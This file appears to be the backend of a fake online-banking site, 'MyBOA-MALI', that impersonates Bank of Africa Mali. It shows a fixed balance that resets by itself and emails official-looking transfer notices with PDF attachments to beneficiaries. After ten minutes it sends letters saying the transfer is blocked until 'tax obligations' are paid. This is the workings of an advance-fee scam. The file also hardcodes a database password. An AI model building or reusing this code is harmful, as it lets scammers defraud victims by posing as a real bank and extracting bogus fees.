const express = require('express');
const cors    = require('cors');
const https   = require('https');
const { MongoClient } = require('mongodb');

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://myboamali:MyBOA2026!@cluster0.f4iatj8.mongodb.net/?appName=Cluster0';
const DB_NAME = 'myboamali';
const COLLECTION_NAME = 'dashboard';

let db = null;

async function connectDB() {
    try {
        const client = new MongoClient(MONGODB_URI);
        await client.connect();
        db = client.db(DB_NAME);
        console.log('MongoDB connecte avec succes');
    } catch(e) {
        console.error('Erreur MongoDB:', e);
    }
}

connectDB();

const app = express();
app.use(cors({
    origin: ['https://myboamali.onrender.com', 'https://myboamali.net', 'https://www.myboamali.net', 'http://localhost:3000', 'http://127.0.0.1:5500'],
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Origin']
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const BREVO_API_KEY = process.env.BREVO_API_KEY;

app.post('/send-virement', (req, res) => {
    try {
        const { email_beneficiaire, nom_beneficiaire, montant, devise, reference, date, bic, iban, motif, pays, pdf_base64, civilite } = req.body;

        if (!email_beneficiaire || !pdf_base64) {
            return res.status(400).json({ success: false, message: 'Email et PDF requis' });
        }

        const pdfData = pdf_base64.replace(/^data:[^;]+;[^,]+,/, '').replace(/\s/g, '');
        console.log('PDF base64 length:', pdfData.length);
        console.log('PDF first 50 chars:', pdfData.substring(0, 50));

        const htmlContent = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;font-family:Georgia,serif;background:#f4f4f4;">
<div style="max-width:600px;margin:0 auto;background:white;">

<div style="background:#1D6F4F;height:6px;"></div>

<div style="background:white;padding:24px 40px 16px;border-bottom:1px solid #eee;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td>
<div style="font-size:18px;font-weight:bold;color:#0f1923;letter-spacing:1px;">BANK OF AFRICA</div>
<div style="font-size:10px;color:#888;letter-spacing:2px;margin-top:2px;">BMCE GROUP - MyBOA-MALI</div>
</td>
<td align="right">
<div style="font-size:10px;color:#888;">Bamako, le ${date}</div>
<div style="font-size:10px;color:#888;margin-top:2px;">Ref: ${reference}</div>
</td>
</tr>
</table>
</div>

<div style="background:white;padding:30px 40px;">

<div style="margin-bottom:24px;">
<div style="font-size:11px;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;font-family:Arial,sans-serif;">Objet</div>
<div style="font-size:14px;font-weight:bold;color:#0f1923;font-family:Arial,sans-serif;">Avis de reception d un ordre de virement international</div>
</div>

<p style="font-size:13px;color:#333;line-height:1.8;margin:0 0 16px;">${civilite || 'Madame, Monsieur'} <strong>${nom_beneficiaire}</strong>,</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 16px;">
Nous avons le plaisir de vous informer qu un ordre de virement international a ete emis en votre faveur par <strong>BRUNET JEAN PAUL</strong> via la plateforme <strong>MyBOA-MALI</strong> - Bank Of Africa.
</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 24px;">
Ce virement est actuellement <strong>en attente de traitement</strong>. Les fonds seront credites sur votre compte dans un delai de <strong>2 a 5 jours ouvrables</strong> selon les procedures interbancaires internationales en vigueur.
</p>

<div style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;margin-bottom:24px;">
<div style="background:#0f1923;padding:10px 16px;">
<span style="color:white;font-size:12px;font-weight:bold;letter-spacing:1px;font-family:Arial,sans-serif;">RECAPITULATIF DU VIREMENT</span>
</div>
<table width="100%" style="border-collapse:collapse;font-family:Arial,sans-serif;">
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;width:45%;">Reference</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${reference}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Montant</td>
<td style="padding:10px 16px;font-size:13px;color:#1D6F4F;font-weight:bold;border-bottom:1px solid #eee;">${montant} ${devise || 'CFA'}</td>
</tr>
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Date d emission</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${date}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">BIC / SWIFT</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${bic}</td>
</tr>
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">IBAN</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${iban}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Pays</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${pays}</td>
</tr>
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;">Statut</td>
<td style="padding:10px 16px;"><span style="background:#fff3cd;color:#856404;font-size:11px;font-weight:bold;padding:3px 10px;border-radius:10px;font-family:Arial,sans-serif;">En attente de traitement</span></td>
</tr>
</table>
</div>

<div style="border-left:3px solid #1D6F4F;padding:12px 16px;background:#f4fbf7;margin-bottom:24px;border-radius:0 6px 6px 0;">
<p style="font-size:13px;color:#1D6F4F;font-weight:bold;margin:0 0 4px;font-family:Arial,sans-serif;">Document officiel joint</p>
<p style="font-size:12px;color:#555;margin:0;font-family:Arial,sans-serif;">Veuillez trouver ci-joint l avis de virement officiel au format PDF. Conservez ce document comme preuve de transaction.</p>
</div>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 8px;">Nous restons a votre disposition pour toute question relative a cette operation.</p>
<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 24px;">Veuillez agreer, ${civilite || 'Madame, Monsieur'}, l expression de nos salutations distinguees.</p>

<div style="font-size:13px;color:#0f1923;font-weight:bold;font-family:Arial,sans-serif;">MyBOA-MALI - Bank Of Africa</div>
<div style="font-size:11px;color:#888;margin-top:2px;font-family:Arial,sans-serif;">Service des operations internationales</div>
<div style="font-size:11px;color:#888;font-family:Arial,sans-serif;">support@myboamali.net</div>
</div>

<div style="background:#0f1923;padding:14px 40px;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td style="font-size:10px;color:rgba(180,200,210,0.7);font-family:Arial,sans-serif;">2026 BANK OF AFRICA - MyBOA-MALI - Tous droits reserves</td>
<td style="text-align:right;font-size:10px;color:#4CAF50;font-weight:bold;font-family:Arial,sans-serif;">www.myboamali.net</td>
</tr>
</table>
</div>

<div style="background:#1D6F4F;height:4px;"></div>

</div>
</body>
</html>`;

        const emailData = JSON.stringify({
            sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
            to: [{ email: email_beneficiaire, name: nom_beneficiaire }],
            subject: 'MyBOA-MALI - Avis de virement en votre faveur - Ref: ' + reference,
            htmlContent: htmlContent,
            attachment: [{
                content: pdfData,
                name: 'Avis-Virement-' + reference + '.pdf',
                type: 'application/pdf'
            }]
        });

        const options = {
            hostname: 'api.brevo.com',
            port: 443,
            path: '/v3/smtp/email',
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'api-key': BREVO_API_KEY
            }
        };

        const reqBrevo = https.request(options, (resBrevo) => {
            let data = '';
            resBrevo.on('data', (chunk) => { data += chunk; });
            resBrevo.on('end', () => {
                console.log('Brevo status:', resBrevo.statusCode, data);
                if (resBrevo.statusCode === 201) {
                    res.json({ success: true, message: 'Email envoye avec succes' });
                } else {
                    res.status(500).json({ success: false, message: 'Erreur Brevo: ' + data });
                }
            });
        });

        reqBrevo.on('error', (e) => {
            console.error('Erreur Brevo:', e);
            res.status(500).json({ success: false, message: 'Erreur: ' + e.message });
        });

        reqBrevo.write(emailData);
        reqBrevo.end();

    } catch (error) {
        console.error('Erreur serveur:', error);
        res.status(500).json({ success: false, message: 'Erreur: ' + error.message });
    }
});

app.post('/send-certicode', (req, res) => {
    try {
        const { email, passcode, time } = req.body;

        if (!email || !passcode) {
            return res.status(400).json({ success: false, message: 'Email et code requis' });
        }

        const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"></head>
        <body style="font-family:Arial,sans-serif;background:#f4f4f4;margin:0;padding:0;">
        <div style="max-width:500px;margin:0 auto;background:white;">
            <div style="background:#0f1923;padding:20px 30px;">
                <table width="100%"><tr>
                    <td><div style="color:white;font-size:13px;font-weight:bold;">BANK OF AFRICA</div>
                    <div style="color:rgba(180,200,210,0.8);font-size:10px;">BMCE GROUP - MyBOA-MALI</div></td>
                    <td align="right"><div style="color:white;font-size:16px;font-weight:bold;">CODE D'ACCÈS SÉCURISÉ</div></td>
                </tr></table>
            </div>
            <div style="background:#1D6F4F;height:4px;"></div>
            <div style="padding:30px;">
                <p style="color:#333;font-size:15px;">Bonjour,</p>
                <p style="color:#666;font-size:13px;line-height:1.6;">
                    Votre code d'accès sécurisé MyBOA-MALI est :
                </p>
                <div style="background:#0f1923;border-radius:10px;padding:20px;text-align:center;margin:20px 0;">
                    <div style="color:rgba(180,200,210,0.8);font-size:11px;margin-bottom:10px;">CODE D'ACCÈS</div>
                    <div style="color:white;font-size:36px;font-weight:bold;letter-spacing:8px;">${passcode}</div>
                    <div style="color:#1D6F4F;font-size:12px;margin-top:10px;">Valable jusqu'à ${time}</div>
                </div>
                <div style="background:#fff8e1;border:1px solid #f39c12;border-radius:6px;padding:12px;margin-top:20px;">
                    <div style="color:#e67e22;font-size:12px;font-weight:bold;">⚠ SÉCURITÉ</div>
                    <div style="color:#666;font-size:12px;margin-top:4px;">Ne partagez jamais ce code. MyBOA-MALI ne vous demandera jamais ce code par téléphone ou email.</div>
                </div>
            </div>
            <div style="background:#0f1923;padding:15px 30px;text-align:center;">
                <p style="color:rgba(100,120,140,0.9);font-size:10px;margin:3px 0;">2026 BANK OF AFRICA - MyBOA-MALI</p>
                <p style="color:#4CAF50;font-weight:bold;font-size:10px;margin:3px 0;">www.myboamali.net</p>
            </div>
        </div>
        </body>
        </html>`;

        const emailData = JSON.stringify({
            sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
            to: [{ email: email, name: 'Client MyBOA-MALI' }],
            subject: 'MyBOA-MALI - Votre code d acces securise',
            htmlContent: htmlContent
        });

        const options = {
            hostname: 'api.brevo.com',
            port: 443,
            path: '/v3/smtp/email',
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'api-key': BREVO_API_KEY
            }
        };

        const reqBrevo = https.request(options, (resBrevo) => {
            let data = '';
            resBrevo.on('data', (chunk) => { data += chunk; });
            resBrevo.on('end', () => {
                console.log('Certicode Brevo status:', resBrevo.statusCode, data);
                if (resBrevo.statusCode === 201) {
                    res.json({ success: true });
                } else {
                    res.status(500).json({ success: false, message: data });
                }
            });
        });

        reqBrevo.on('error', (e) => {
            res.status(500).json({ success: false, message: e.message });
        });

        reqBrevo.write(emailData);
        reqBrevo.end();

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/reset-solde', async (req, res) => {
    try {
        if (db) {
            await db.collection(COLLECTION_NAME).updateOne(
                { _id: 'dashboard' },
                { $set: { solde: 1311914000 } },
                { upsert: true }
            );
        }
        res.json({ success: true, message: 'Solde réinitialisé à 1 311 914 000 CFA (2 000 000 EUR)' });
    } catch(error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/get-data', async (req, res) => {
    try {
        var data = null;
        if (db) {
            data = await db.collection(COLLECTION_NAME).findOne({ _id: 'dashboard' });
        }
        if (!data) {
            data = {
                _id: 'dashboard',
                solde: 1311914000,
                date_dernier_virement: null,
                devise_affichage: 'CFA',
                historique: [],
                notifications: [],
                notif_non_lues: 0
            };
        }
        // Vérifier réinitialisation 3 jours
        if (data.date_dernier_virement) {
            var maintenant = new Date().getTime();
            var dernierVirement = new Date(data.date_dernier_virement).getTime();
            var troisJours = 3 * 24 * 60 * 60 * 1000;
            if (maintenant - dernierVirement >= troisJours) {
                data.solde = 1311914000;
                data.date_dernier_virement = null;
                data.historique = [];
                data.notifications = [];
                data.notif_non_lues = 0;
                if (db) {
                    await db.collection(COLLECTION_NAME).updateOne(
                        { _id: 'dashboard' },
                        { $set: data },
                        { upsert: true }
                    );
                }
            }
        }

        // Vérifier les virements expirés (rejet automatique)
        var virementsRejetes = [];
        if (data.historique && data.historique.length > 0) {
            data.historique = data.historique.map(function(op) {
                if (op.statut === 'En attente de traitement' && op.date_expiration) {
                    var maintenant = new Date().getTime();
                    var expiration = new Date(op.date_expiration).getTime();
                    if (maintenant >= expiration) {
                        op.statut = 'Rejeté';
                        
                        // Recréditer le montant sur le solde
                        var montantStr = (op.montant || '0').toString().replace(/\s/g, '').replace(',', '.');
                        var montantVirement = parseFloat(montantStr) || 0;
                        var deviseVirement = op.devise || 'CFA';
                        var tauxConversion = { CFA:1, EUR:655.957, USD:600, GBP:750, CHF:620, CAD:450 };
                        var montantCFA = deviseVirement === 'CFA' ? montantVirement : montantVirement * (tauxConversion[deviseVirement] || 1);
                        data.solde = (data.solde || 0) + montantCFA;
                        console.log('Recrédit solde:', montantCFA, 'CFA pour virement', op.reference);

                        // Ajouter notification de recrédit
                        data.notifications = data.notifications || [];
                        data.notifications.unshift({
                            id: Date.now(),
                            message: 'Virement ' + op.reference + ' rejeté — ' + op.montant + ' ' + deviseVirement + ' recrédité sur votre compte',
                            type: 'rejet',
                            date: new Date().toLocaleString('fr-FR'),
                            lue: false
                        });
                        data.notif_non_lues = (data.notif_non_lues || 0) + 1;

                        virementsRejetes.push(op);
                    }
                }
                return op;
            });
            
            if (virementsRejetes.length > 0) {
                // Sauvegarder les changements (historique, solde, notifications)
                if (db) {
                    await db.collection(COLLECTION_NAME).updateOne(
                        { _id: 'dashboard' },
                        { $set: { 
                            historique: data.historique,
                            solde: data.solde,
                            notifications: data.notifications,
                            notif_non_lues: data.notif_non_lues
                        } },
                        { upsert: true }
                    );
                }
                
                // Envoyer email de rejet pour chaque virement rejeté
                for (var i = 0; i < virementsRejetes.length; i++) {
                    var vir = virementsRejetes[i];
                    if (vir.email_beneficiaire) {
                        var htmlRejet = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background:#f4f4f4;">
<div style="max-width:600px;margin:0 auto;background:white;">

<div style="background:#1D6F4F;height:6px;"></div>

<div style="background:#0f1923;padding:20px 30px;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td>
<div style="color:white;font-size:14px;font-weight:bold;letter-spacing:1px;">BANK OF AFRICA</div>
<div style="color:rgba(180,200,210,0.7);font-size:10px;margin-top:2px;">BMCE GROUP - MyBOA-MALI</div>
</td>
<td align="right">
<div style="color:white;font-size:15px;font-weight:bold;">NOTIFICATION OFFICIELLE</div>
<div style="color:rgba(180,200,210,0.7);font-size:10px;margin-top:2px;">Service des operations internationales</div>
</td>
</tr>
</table>
</div>

<div style="background:#1D6F4F;height:3px;"></div>

<div style="background:#f8f9fa;padding:12px 30px;border-bottom:1px solid #eee;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td style="font-size:10px;color:#999;">Reference<br><strong style="color:#1a1a1a;font-size:13px;">${vir.reference}</strong></td>
<td style="font-size:10px;color:#999;">Date<br><strong style="color:#1a1a1a;font-size:13px;">${vir.date}</strong></td>
<td align="right"><span style="background:#c0392b;color:white;padding:4px 10px;border-radius:12px;font-size:10px;font-weight:bold;">VIREMENT BLOQUE</span></td>
</tr>
</table>
</div>

<div style="background:white;padding:28px 30px;">

<p style="font-size:14px;color:#333;margin:0 0 16px;">${vir.civilite || 'Monsieur'} <strong>${vir.nom_beneficiaire}</strong>,</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 16px;">
Suite a l analyse de votre dossier, il apparait que certaines obligations fiscales liees 
a votre situation personnelle demeurent a ce jour <strong>non regularisees</strong>.
</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 20px;">
A ce titre, il est imperatif que l ensemble des frais mentionnes 
<strong>(droits, penalites, majorations ainsi que les impositions afferentes)</strong> 
soit integralement regle avant toute possibilite de deblocage definitif du compte 
et d utilisation des fonds.
</p>

<div style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;margin-bottom:22px;">
<div style="background:#0f1923;padding:10px 16px;">
<span style="color:white;font-size:11px;font-weight:bold;letter-spacing:1px;">RECAPITULATIF DU VIREMENT BLOQUE</span>
</div>
<table width="100%" style="border-collapse:collapse;">
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;width:45%;">Reference</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${vir.reference}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Montant bloque</td>
<td style="padding:10px 16px;font-size:13px;color:#c0392b;font-weight:bold;border-bottom:1px solid #eee;">${vir.montant} ${vir.devise || 'CFA'}</td>
</tr>
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Date d emission</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${vir.date}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;">Statut</td>
<td style="padding:10px 16px;"><span style="background:#fde8e8;color:#791F1F;font-size:11px;font-weight:bold;padding:3px 10px;border-radius:10px;">Bloque - En attente de regularisation</span></td>
</tr>
</table>
</div>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 16px;">
Nous vous invitons donc a proceder a la regularisation de ces montants dans les meilleurs delais 
afin de permettre la poursuite normale des operations sur votre compte.
</p>

<div style="border-left:3px solid #c0392b;padding:12px 16px;background:#fdf2f2;margin-bottom:22px;border-radius:0 6px 6px 0;">
<p style="font-size:13px;color:#c0392b;font-weight:bold;margin:0 0 6px;">ACTION REQUISE</p>
<p style="font-size:12px;color:#555;margin:0;line-height:1.6;">
Veuillez contacter immediatement notre service des operations internationales 
pour regulariser votre situation et proceder au deblocage de vos fonds.
<br><strong>Contact : support@myboamali.net</strong>
</p>
</div>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 8px;">
Nous restons a votre entiere disposition pour tout complement d information.
</p>
<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 24px;">
Veuillez agreer, ${vir.civilite || 'Monsieur'}, l expression de nos salutations distinguees.
</p>

<div style="font-size:13px;color:#0f1923;font-weight:bold;">MyBOA-MALI - Bank Of Africa</div>
<div style="font-size:11px;color:#888;margin-top:2px;">Service des operations internationales</div>
<div style="font-size:11px;color:#1D6F4F;margin-top:2px;">support@myboamali.net</div>
</div>

<div style="background:#0f1923;padding:14px 30px;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td style="font-size:10px;color:rgba(180,200,210,0.6);">2026 BANK OF AFRICA - MyBOA-MALI - Tous droits reserves</td>
<td style="text-align:right;font-size:10px;color:#4CAF50;font-weight:bold;">www.myboamali.net</td>
</tr>
</table>
</div>

<div style="background:#1D6F4F;height:4px;"></div>

</div>
</body>
</html>`;

                        const emailRejetData = JSON.stringify({
                            sender: { name: 'MyBOA-MALI', email: 'noreply@myboamali.net' },
                            to: [{ email: vir.email_beneficiaire, name: vir.nom_beneficiaire }],
                            subject: 'MyBOA-MALI - Avis de rejet de virement - Ref: ' + vir.reference,
                            htmlContent: htmlRejet
                        });

                        const optionsRejet = {
                            hostname: 'api.brevo.com',
                            port: 443,
                            path: '/v3/smtp/email',
                            method: 'POST',
                            headers: {
                                'Accept': 'application/json',
                                'Content-Type': 'application/json',
                                'api-key': BREVO_API_KEY
                            }
                        };

                        await new Promise((resolve) => {
                            const reqRejet = https.request(optionsRejet, (resRejet) => {
                                let dataRejet = '';
                                resRejet.on('data', (chunk) => { dataRejet += chunk; });
                                resRejet.on('end', () => {
                                    console.log('Email rejet envoye pour', vir.reference, '- Status:', resRejet.statusCode);
                                    resolve();
                                });
                            });
                            reqRejet.on('error', (e) => { console.error('Erreur email rejet:', e); resolve(); });
                            reqRejet.write(emailRejetData);
                            reqRejet.end();
                        });
                    }
                }
            }
        }
        res.json({ success: true, data: data });
    } catch(error) {
        console.error('Erreur get-data:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

app.post('/save-data', async (req, res) => {
    try {
        var newData = req.body;
        if (!newData) return res.status(400).json({ success: false, message: 'Donnees manquantes' });
        
        // Ajouter date_expiration aux nouveaux virements si non présente
        if (newData.historique && Array.from(newData.historique).length > 0) {
            newData.historique.forEach(function(op) {
                if (op.statut === 'En attente de traitement' && !op.date_expiration) {
                    op.date_expiration = new Date(new Date().getTime() + 10 * 60 * 1000).toISOString();
                }
            });
        }

        newData._id = 'dashboard';
        if (db) {
            await db.collection(COLLECTION_NAME).updateOne(
                { _id: 'dashboard' },
                { $set: newData },
                { upsert: true }
            );
        }
        res.json({ success: true });
    } catch(error) {
        console.error('Erreur save-data:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/ping', (req, res) => {
    res.json({ status: 'ok', message: 'Serveur MyBOA-MALI operationnel' });
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log('Serveur MyBOA-MALI demarre sur port', PORT);
});
